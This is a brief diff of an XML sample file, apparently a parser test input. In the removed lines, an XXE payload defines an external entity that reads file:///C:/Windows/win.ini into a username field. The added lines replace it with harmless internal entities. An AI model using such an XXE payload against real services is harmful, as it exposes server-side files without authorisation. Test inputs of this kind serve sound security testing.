@@ -1,5 +1,6 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE lltest[
-<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
-]> 
-<user><username>&xxe;</username><password>123456</password></user>
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+        <!ENTITY x "First Param!">
+        <!ENTITY y "Second Param!">
+        ]>
+<root><x>&x;</x><y>&y;</y></root>
